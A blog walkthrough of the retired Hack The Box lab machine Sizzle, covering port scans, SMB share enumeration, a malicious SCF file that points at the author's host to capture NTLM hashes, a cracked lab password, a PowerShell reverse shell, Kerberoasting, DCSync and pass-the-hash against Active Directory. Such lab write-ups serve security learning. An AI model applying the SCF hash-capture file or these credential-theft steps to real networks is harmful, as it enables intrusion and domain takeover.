---
layout: post
title: "Sizzle: Hack The Box Walkthrough"
date: 2019-06-01 16:38:28 +0000
last_modified_at: 2019-06-02 21:27:58 +0000
category: Walkthrough
tags: ["Hack The Box", Sizzle, retired]
comments: true
image:
  feature: sizzle-htb-walkthrough.jpg
  credit: piviso / Pixabay
  creditlink: https://pixabay.com/photos/sizzling-hot-bacon-pieces-food-2650322/
---

This post documents the complete walkthrough of Sizzle, a retired vulnerable [VM][1] created by [lkys37en][2] and [mrb3n][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post 
{:.no_toc} 

* TOC 
{:toc}

## Background

Sizzle is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.103 --rate=1000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-03-09 05:39:40 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 57714/udp on 10.10.10.103
Discovered open port 65515/tcp on 10.10.10.103
Discovered open port 49665/tcp on 10.10.10.103
Discovered open port 49680/tcp on 10.10.10.103
Discovered open port 5986/tcp on 10.10.10.103
Discovered open port 593/tcp on 10.10.10.103
Discovered open port 49681/tcp on 10.10.10.103
Discovered open port 5985/tcp on 10.10.10.103
Discovered open port 49664/tcp on 10.10.10.103
Discovered open port 139/tcp on 10.10.10.103
Discovered open port 3268/tcp on 10.10.10.103
Discovered open port 443/tcp on 10.10.10.103
Discovered open port 53/tcp on 10.10.10.103
Discovered open port 49667/tcp on 10.10.10.103
Discovered open port 3269/tcp on 10.10.10.103
Discovered open port 21/tcp on 10.10.10.103
Discovered open port 47001/tcp on 10.10.10.103
Discovered open port 56723/udp on 10.10.10.103
Discovered open port 49689/tcp on 10.10.10.103
Discovered open port 9389/tcp on 10.10.10.103
Discovered open port 464/tcp on 10.10.10.103
Discovered open port 389/tcp on 10.10.10.103
Discovered open port 49679/tcp on 10.10.10.103
Discovered open port 49666/tcp on 10.10.10.103
Discovered open port 49700/tcp on 10.10.10.103
Discovered open port 135/tcp on 10.10.10.103
Discovered open port 65489/tcp on 10.10.10.103
Discovered open port 445/tcp on 10.10.10.103
Discovered open port 636/tcp on 10.10.10.103
Discovered open port 80/tcp on 10.10.10.103
Discovered open port 49684/tcp on 10.10.10.103
Discovered open port 57347/udp on 10.10.10.103
```

Whoa. That's a lot of open ports! Let's do one better with `nmap` scanning the pertinent open ports. I'll skip the ports above `47001/tcp`—likely to be from RPC.

```
# nmap -n -v -Pn -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389 -A --reason 10.10.10.103 -oN nmap.txt
...
PORT     STATE SERVICE       REASON          VERSION
21/tcp   open  ftp           syn-ack ttl 127 Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|_  SYST: Windows_NT
53/tcp   open  domain?       syn-ack ttl 127
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-03T17:58:55
| Not valid after:  2020-07-02T17:58:55
| MD5:   240b 1eff 5a65 ad8d c64d 855e aeb5 9e6b
|_SHA-1: 77bb 3f67 1b6b 3e09 b8f9 6503 ddc1 0bbf 0b75 0c72
|_ssl-date: 2019-03-09T05:55:56+00:00; -2s from scanner time.
443/tcp  open  ssl/http      syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=sizzle.htb.local
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-03T17:58:55
| Not valid after:  2020-07-02T17:58:55
| MD5:   240b 1eff 5a65 ad8d c64d 855e aeb5 9e6b
|_SHA-1: 77bb 3f67 1b6b 3e09 b8f9 6503 ddc1 0bbf 0b75 0c72
|_ssl-date: 2019-03-09T05:55:52+00:00; -1s from scanner time.
| tls-alpn:
|   h2
|_  http/1.1
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-03T17:58:55
| Not valid after:  2020-07-02T17:58:55
| MD5:   240b 1eff 5a65 ad8d c64d 855e aeb5 9e6b
|_SHA-1: 77bb 3f67 1b6b 3e09 b8f9 6503 ddc1 0bbf 0b75 0c72
|_ssl-date: 2019-03-09T05:55:56+00:00; -1s from scanner time.
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-03T17:58:55
| Not valid after:  2020-07-02T17:58:55
| MD5:   240b 1eff 5a65 ad8d c64d 855e aeb5 9e6b
|_SHA-1: 77bb 3f67 1b6b 3e09 b8f9 6503 ddc1 0bbf 0b75 0c72
|_ssl-date: 2019-03-09T05:55:56+00:00; -1s from scanner time.
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-03T17:58:55
| Not valid after:  2020-07-02T17:58:55
| MD5:   240b 1eff 5a65 ad8d c64d 855e aeb5 9e6b
|_SHA-1: 77bb 3f67 1b6b 3e09 b8f9 6503 ddc1 0bbf 0b75 0c72
|_ssl-date: 2019-03-09T05:55:53+00:00; -1s from scanner time.
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-02T20:26:23
| Not valid after:  2019-07-02T20:26:23
| MD5:   acd1 5e32 da9d 89e2 cde5 7b46 ca12 1d5e
|_SHA-1: 06b2 0070 6600 2651 4c70 054f b1aa 9c15 cadd f233
|_ssl-date: 2019-03-09T05:55:56+00:00; -2s from scanner time.
| tls-alpn:
|   h2
|_  http/1.1
9389/tcp open  mc-nmf        syn-ack ttl 127 .NET Message Framing
...
Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2019-03-09 05:55:58
|_  start_date: 2019-03-08 19:23:58
```

Wow. Again, too much information. Let's check out the file shares. But before we do that, notice that [WS-Management and PowerShell remoting](https://blogs.msdn.microsoft.com/wmi/2009/07/22/new-default-ports-for-ws-management-and-powershell-remoting/) is available at `5985/tcp` and `5986/tcp` for connections over HTTP and HTTPS respectively. Let's keep that in mind and make a mental note.

## Common Internet File System

```
# smbclient -L SIZZLE -I 10.10.10.103 -N
        Sharename         Type      Comment
        ---------         ----      -------
        ADMIN$            Disk      Remote Admin
        C$                Disk      Default share
        CertEnroll        Disk      Active Directory Certificate Services share
        Department Shares Disk      
        IPC$              IPC       Remote IPC
        NETLOGON          Disk      Logon server share
        Operations        Disk      
        SYSVOL            Disk      Logon server share
```

Long story short. Only `Department Shares` yields something tangible. Here's the command to mount it.

```
# mount -t cifs -o "rw,username=guest,uid=0,gid=0" "//10.10.10.103/Department Shares" ds
```

And to list the contents of the mounted share recursively.

```
# ls -laR ds/
...
ds/Users:
total 28
drwxr-xr-x 2 root root  4096 Jul 10  2018 .
drwxr-xr-x 2 root root 24576 Jul  3  2018 ..
drwxr-xr-x 2 root root     0 Jul  2  2018 amanda
drwxr-xr-x 2 root root     0 Jul  2  2018 amanda_adm
drwxr-xr-x 2 root root     0 Jul  2  2018 bill
drwxr-xr-x 2 root root     0 Jul  2  2018 bob
drwxr-xr-x 2 root root     0 Jul  2  2018 chris
drwxr-xr-x 2 root root     0 Jul  2  2018 henry
drwxr-xr-x 2 root root     0 Jul  2  2018 joe
drwxr-xr-x 2 root root     0 Jul  2  2018 jose
drwxr-xr-x 2 root root     0 Jul 10  2018 lkys37en
drwxr-xr-x 2 root root     0 Jul  2  2018 morgan
drwxr-xr-x 2 root root     0 Jul  2  2018 mrb3n
drwxr-xr-x 2 root root     0 Mar  8 21:41 Public
...
ds/ZZ_ARCHIVE:
total 21052
drwxr-xr-x 2 root root  16384 Jul  2  2018 .
drwxr-xr-x 2 root root  24576 Jul  3  2018 ..
-rwxr-xr-x 1 root root 419430 Jul  2  2018 AddComplete.pptx
-rwxr-xr-x 1 root root 419430 Jul  2  2018 AddMerge.ram
-rwxr-xr-x 1 root root 419430 Jul  2  2018 ConfirmUnprotect.doc
-rwxr-xr-x 1 root root 419430 Jul  2  2018 ConvertFromInvoke.mov
-rwxr-xr-x 1 root root 419430 Jul  2  2018 ConvertJoin.docx
-rwxr-xr-x 1 root root 419430 Jul  2  2018 CopyPublish.ogg
-rwxr-xr-x 1 root root 419430 Jul  2  2018 DebugMove.mpg
-rwxr-xr-x 1 root root 419430 Jul  2  2018 DebugSelect.mpg
-rwxr-xr-x 1 root root 419430 Jul  2  2018 DebugUse.pptx
-rwxr-xr-x 1 root root 419430 Jul  2  2018 DisconnectApprove.ogg
-rwxr-xr-x 1 root root 419430 Jul  2  2018 DisconnectDebug.mpeg2
-rwxr-xr-x 1 root root 419430 Jul  2  2018 EditCompress.xls
-rwxr-xr-x 1 root root 419430 Jul  2  2018 EditMount.doc
-rwxr-xr-x 1 root root 419430 Jul  2  2018 EditSuspend.mp3
-rwxr-xr-x 1 root root 419430 Jul  2  2018 EnableAdd.pptx
-rwxr-xr-x 1 root root 419430 Jul  2  2018 EnablePing.mov
-rwxr-xr-x 1 root root 419430 Jul  2  2018 EnableSend.ppt
-rwxr-xr-x 1 root root 419430 Jul  2  2018 EnterMerge.mpeg
-rwxr-xr-x 1 root root 419430 Jul  2  2018 ExitEnter.mpg
-rwxr-xr-x 1 root root 419430 Jul  2  2018 ExportEdit.ogg
-rwxr-xr-x 1 root root 419430 Jul  2  2018 GetOptimize.pdf
-rwxr-xr-x 1 root root 419430 Jul  2  2018 GroupSend.rm
-rwxr-xr-x 1 root root 419430 Jul  2  2018 HideExpand.rm
-rwxr-xr-x 1 root root 419430 Jul  2  2018 InstallWait.pptx
-rwxr-xr-x 1 root root 419430 Jul  2  2018 JoinEnable.ram
-rwxr-xr-x 1 root root 419430 Jul  2  2018 LimitInstall.doc
-rwxr-xr-x 1 root root 419430 Jul  2  2018 LimitStep.ppt
-rwxr-xr-x 1 root root 419430 Jul  2  2018 MergeBlock.mp3
-rwxr-xr-x 1 root root 419430 Jul  2  2018 MountClear.mpeg2
-rwxr-xr-x 1 root root 419430 Jul  2  2018 MoveUninstall.docx
-rwxr-xr-x 1 root root 419430 Jul  2  2018 NewInitialize.doc
-rwxr-xr-x 1 root root 419430 Jul  2  2018 OutConnect.mpeg2
-rwxr-xr-x 1 root root 419430 Jul  2  2018 PingGet.dot
-rwxr-xr-x 1 root root 419430 Jul  2  2018 ReceiveInvoke.mpeg2
-rwxr-xr-x 1 root root 419430 Jul  2  2018 RemoveEnter.mpeg3
-rwxr-xr-x 1 root root 419430 Jul  2  2018 RemoveRestart.mpeg
-rwxr-xr-x 1 root root 419430 Jul  2  2018 RequestJoin.mpeg2
-rwxr-xr-x 1 root root 419430 Jul  2  2018 RequestOpen.ogg
-rwxr-xr-x 1 root root 419430 Jul  2  2018 ResetCompare.avi
-rwxr-xr-x 1 root root 419430 Jul  2  2018 ResetUninstall.mpeg
-rwxr-xr-x 1 root root 419430 Jul  2  2018 ResumeCompare.doc
-rwxr-xr-x 1 root root 419430 Jul  2  2018 SelectPop.ogg
-rwxr-xr-x 1 root root 419430 Jul  2  2018 SuspendWatch.mp4
-rwxr-xr-x 1 root root 419430 Jul  2  2018 SwitchConvertFrom.mpg
-rwxr-xr-x 1 root root 419430 Jul  2  2018 UndoPing.rm
-rwxr-xr-x 1 root root 419430 Jul  2  2018 UninstallExpand.mp3
-rwxr-xr-x 1 root root 419430 Jul  2  2018 UnpublishSplit.ppt
-rwxr-xr-x 1 root root 419430 Jul  2  2018 UnregisterPing.pptx
-rwxr-xr-x 1 root root 419430 Jul  2  2018 UpdateRead.mpeg
-rwxr-xr-x 1 root root 419430 Jul  2  2018 WaitRevoke.pptx
-rwxr-xr-x 1 root root 419430 Jul  2  2018 WriteUninstall.mp3
```

Alternatively, we can use `smbmap` to achieve the same result.

```
# smbmap -H 10.10.10.103 -u guest -R
```

`ZZ_ARCHIVE` is nothing but a rabbit hole. Notice the files here have the same size? Well, at least we manage to get some usernames, and we can write to `\Users\Public` and `\ZZ_Archive`.

## Directory/File Enumeration

Let's move on to the `http` service. Here's how it looks like.

<a class="image-popup">
![7d0169ae.png](/assets/images/posts/sizzle-htb-walkthrough/7d0169ae.png)
</a>

Sizzling. I certainly like me some crispy bacon! Let's see what we can find with `wfuzz`

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 -t 20 http://sizzle.htb.local/FUZZ                                                                
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://sizzle.htb.local/FUZZ
Total requests: 4593

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000182:  C=301      1 L       10 W          154 Ch        "Images"
000634:  C=301      1 L       10 W          161 Ch        "aspnet_client"
000931:  C=301      1 L       10 W          158 Ch        "certenroll"
000938:  C=401     29 L      100 W         1293 Ch        "certsrv"
002067:  C=301      1 L       10 W          154 Ch        "images"
002094:  C=200      0 L        5 W           60 Ch        "index.html"

Total time: 46.71118
Processed Requests: 4593
Filtered Requests: 4587
Requests/sec.: 98.32761
```

It appears that Microsoft Active Directory Certificate Services is enabled with `/certenroll` and `/certsrv`. And guess what, `/certsrv` requires NTLM Authentication.

<a class="image-popup">
![afb0fc24.png](/assets/images/posts/sizzle-htb-walkthrough/afb0fc24.png)
</a>

## Shell Command File Attack

Since the other enumeration didn't yield tangible results, perhaps we can launch a client-side attack using Shell Command File (SCF) to harvest SMB credentials in the form of NTLM hashes. Even if a file share doesn’t contain any data that could be used to connect to other systems, and it's configured with write permissions for unauthenticated users, then it is possible to obtain passwords hashes with a malicious SCF file like this.

<div class="filename"><span>1.scf</span></div>

```
[Shell]
Command=2
IconFile=\\10.10.12.129\share\test.ico
[Taskbar]
Command=ToggleDesktop
```

Before we put the file to the file share, let's start Responder.

<a class="image-popup">
![11901669.png](/assets/images/posts/sizzle-htb-walkthrough/11901669.png)
</a>

Almost immediately after I put `1.scf` to `\Users\Public`, I got the hash of `amanda`.

<a class="image-popup">
![e3d5fb91.png](/assets/images/posts/sizzle-htb-walkthrough/e3d5fb91.png)
</a>

Sending the hash to John the Ripper reveals the password of `amanda` to be `Ashare1972`.

Armed with the credential (`amanda:Ashare1972`), I can now access Microsoft Active Directory Certificate Services.

## Microsoft Active Directory Certificate Services

Here's how it looks like.

<a class="image-popup">
![a809c79d.png](/assets/images/posts/sizzle-htb-walkthrough/a809c79d.png)
</a>

Request for a user certificate.

<a class="image-popup">
![fb10e96a.png](/assets/images/posts/sizzle-htb-walkthrough/fb10e96a.png)
</a>

Install the user certificate.

<a class="image-popup">
![e350506f.png](/assets/images/posts/sizzle-htb-walkthrough/e350506f.png)
</a>

Once you click **Install this certificate**, your browser's personal certificate should look like this.

<a class="image-popup">
![5ce2c26f.png](/assets/images/posts/sizzle-htb-walkthrough/5ce2c26f.png)
</a>

What next? PowerShell Remoting!

## Windows Remote Management (WinRM)

For the sake of convenience, I'll use a Windows 10 virtual machine to generate a client certificate request and repeat the steps to generate a client certificate for the purpose of client authentication with the remote WinRM service using PowerShell Remoting.

A client certificate for WinRM authentication requires two things:

1. An Extended Key Usage of **Client Authentication**
2. A **Subject Alternative Name** with the **User Principal Name** (UPN).

And since we already have a user certificate used for client authentication, let's export the certificate over to the Windows 10 environment.

Believe me, it's actually easier to use the certmgr MMC snap-in to import the certificate to the Current User certificate store.

<a class="image-popup">
![Import Certificate](/assets/images/posts/sizzle-htb-walkthrough/cert_import.png)
</a>

Once that's done, we can fire up a PowerShell and check for the certificate thumbprint.

<a class="image-popup">
![Certificate Thumbprint](/assets/images/posts/sizzle-htb-walkthrough/cert_thumbprint.png)
</a>

Copy the thumbprint and execute the following commands to get a remote shell into Sizzle as `amanda`.

<a class="image-popup">
![PSRemoting](/assets/images/posts/sizzle-htb-walkthrough/ps_remoting.png)
</a>

Boom. A low-privilege shell!

## PowerShell Downgrade Attack

The PowerShell session I got is using constrained language, and many of the good stuff from PowerSploit won't run. As such, I need to downgrade the session to Version 2.

<a class="image-popup">
![PSVersion](/assets/images/posts/sizzle-htb-walkthrough/ps_version.png)
</a>

Let's run a reverse shell back to myself with the following PowerShell [script](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3).

First, we run Python's SimpleHTTPServer module to host the file.

<a class="image-popup">
![SimpleHTTPServer](/assets/images/posts/sizzle-htb-walkthrough/simplehttpserver.png)
</a>

Then, we download the script with the Invoke-WebRequest cmdlet.

<a class="image-popup">
![Invoke-WebRequest](/assets/images/posts/sizzle-htb-walkthrough/invoke-webrequest.png)
</a>

Execute a `nc` listener.

<a class="image-popup">
![nc](/assets/images/posts/sizzle-htb-walkthrough/nc.png)
</a>

Execute the reverse shell in Version 2.

<a class="image-popup">
![PowerShell Version 2](/assets/images/posts/sizzle-htb-walkthrough/ps_v2.png)
</a>

<a class="image-popup">
![PowerShell Version 2](/assets/images/posts/sizzle-htb-walkthrough/ps_v2_2.png)
</a>

Awesome!

## PowerView and Kerberoasting

Now, we can download and execute PowerView on the session!

<a class="image-popup">
![6a068b42.png](/assets/images/posts/sizzle-htb-walkthrough/6a068b42.png)
</a>

The explanation of kerberoasting is beyond the scope of this write-up. You can read about [kerberoasting](https://adsecurity.org/?p=3458) from Active Directory Security.

Now, we can execute Invoke-Kerberoast but first, as strange as that sounds, we need to impersonate `amanda`. Didn't we already have a session as `amanda`? Here's why.

<a class="image-popup">
![271ee353.png](/assets/images/posts/sizzle-htb-walkthrough/271ee353.png)
</a>

Using Invoke-UserImpersonation is the same as running `runas /netonly`, just like we are executing Invoke-Kerberoast as `amanda` remotely.

<a class="image-popup">
![9ee19afb.png](/assets/images/posts/sizzle-htb-walkthrough/9ee19afb.png)
</a>

Well, well, well. What do we have here? `mrlky`'s Kerberos hash! With that, we can easily get `mrlky`'s password.

<a class="image-popup">
![7187d8ca.png](/assets/images/posts/sizzle-htb-walkthrough/7187d8ca.png)
</a>

Long story short, I repeated the same steps above to generate a user certification for `mrlky` used for client authentication and got myself a PowerShell Remoting session.

<a class="image-popup">
![55162f91.png](/assets/images/posts/sizzle-htb-walkthrough/55162f91.png)
</a>

Here's the session.

<a class="image-popup">
![2157a302.png](/assets/images/posts/sizzle-htb-walkthrough/2157a302.png)
</a>

The `user.txt` is at `mrlky`'s "the other" desktop.

<a class="image-popup">
![16070007.png](/assets/images/posts/sizzle-htb-walkthrough/16070007.png)
</a>

## Privilege Escalation

During enumeration of `mrlky`'s account, I ran SharpHound on the session. The steps are exactly like those outlined in **PowerShell Downgrade Attack** above.

_Downgrading PowerShell_

<a class="image-popup">
![bb1d7ec3.png](/assets/images/posts/sizzle-htb-walkthrough/bb1d7ec3.png)
</a>

_Downgraded PowerShell_

<a class="image-popup">
![8d00a779.png](/assets/images/posts/sizzle-htb-walkthrough/8d00a779.png)
</a>

With that, we can run BloodHound.

<a class="image-popup">
![2bc01fd9.png](/assets/images/posts/sizzle-htb-walkthrough/2bc01fd9.png)
</a>

Once the data is collected, an archive of all the data points in JSON is saved.

<a class="image-popup">
![4f3e48d3.png](/assets/images/posts/sizzle-htb-walkthrough/4f3e48d3.png)
</a>

I'll leave it as an exercise how to exfiltrate the ZIP file out. Here's the graphical view of BloodHound when the data is integrated into the database, and after I ran the **Find Principals with DCSync Rights** pre-built query.

<a class="image-popup">
![092e04e4.png](/assets/images/posts/sizzle-htb-walkthrough/092e04e4.png)
</a>

Did you see the rights that `mrlky` have? Again, Active Directory Security does a far, far better job at explaining [DCSync](https://adsecurity.org/?p=1729) than I ever could. Well, in short, it's something like zone transfer, telling the domain controller, "Hey, I want to be updated about the changes you made".

DCSync came out of Mimikatz, so that's what I'm going to use.

<a class="image-popup">
![8859e885.png](/assets/images/posts/sizzle-htb-walkthrough/8859e885.png)
</a>

Bam! `administrator`'s NTLM hashes are in sight. During my research, I found out that Impacket's `secretsdump.py` can do the same. :wink:

Well, with the `administrator`'s NTLM hash, I can use pass-the-hash method to access C$ share and retrieve `root.txt` from there.

<a class="image-popup">
![c93596a5.png](/assets/images/posts/sizzle-htb-walkthrough/c93596a5.png)
</a>

<a class="image-popup">
![66f354bd.png](/assets/images/posts/sizzle-htb-walkthrough/66f354bd.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/169
[2]: https://www.hackthebox.eu/home/users/profile/709
[3]: https://www.hackthebox.eu/home/users/profile/2984
[4]: https://www.hackthebox.eu/
